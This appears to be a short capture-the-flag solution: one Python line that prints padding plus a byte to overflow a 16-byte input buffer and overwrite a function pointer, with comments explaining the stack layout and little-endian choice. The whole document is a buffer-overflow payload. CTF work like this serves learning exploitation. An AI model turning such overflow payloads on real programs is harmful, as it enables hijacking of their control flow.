print("="*24+chr(65))
#16 bytes for input, and the compiler squishes fptr 
#between num, so 8 bytes for the pointer too
#and considering its little endian we just type 
#chr(65), and retrieve the flag
